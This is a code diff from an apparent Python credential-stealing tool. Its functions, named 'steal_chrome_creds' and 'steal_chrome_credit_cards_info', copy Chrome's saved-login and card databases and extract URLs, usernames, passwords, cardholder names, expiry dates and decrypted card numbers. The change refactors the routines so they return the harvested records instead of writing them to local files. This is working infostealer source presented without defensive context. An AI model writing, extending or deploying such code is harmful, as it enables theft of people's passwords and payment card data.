@@ -95,30 +95,12 @@ def __get_chrome_credit_cards(cur):
     return credit_cards
 
 
-def __write_chrome_creds(chrome_creds):
-    with open(__CHROME_CREDS_COPY_FILE, "w+") as f: # send chrome data to bak file
-        for record in chrome_creds:
-            try:
-                f.write(f"{record['origin_url']}, {record['username']}, {record['password']}\n")
-            except Exception as e:
-                continue
-
-
-def __write_chrome_credit_cards(chrome_credit_cards):
-    with open(__CHROME_CREDIT_CARDS_COPY_FILE, "w+") as f: # send chrome data to bak file
-        for record in chrome_credit_cards:
-            try:
-                f.write(f"{record['name_on_card']}, {record['expiration_month']}, {record['expiration_year']}, {record['card_number_decrypted']}, {record['nickname']}\n")
-            except Exception as e:
-                continue
-
-
 def steal_chrome_creds(): # get chrome credentials
     __copy_db_file(__CHROME_CREDS_ORIGINAL_FILE, __CHROME_CREDS_COPY_FILE)
     con, cur = __open_db_connection(__CHROME_CREDS_COPY_FILE)
     chrome_creds = __get_chrome_creds(cur)
     con.close() # Close SQLite3 connection
-    __write_chrome_creds(chrome_creds)
+    return chrome_creds
 
 
 def steal_chrome_credit_cards_info(): # get chrome credit cards
@@ -126,4 +108,4 @@ def steal_chrome_credit_cards_info(): # get chrome credit cards
     con, cur = __open_db_connection(__CHROME_CREDIT_CARDS_COPY_FILE)
     credit_cards = __get_chrome_credit_cards(cur)
     con.close() # Close SQLite3 connection
-    __write_chrome_credit_cards(credit_cards)
+    return credit_cards
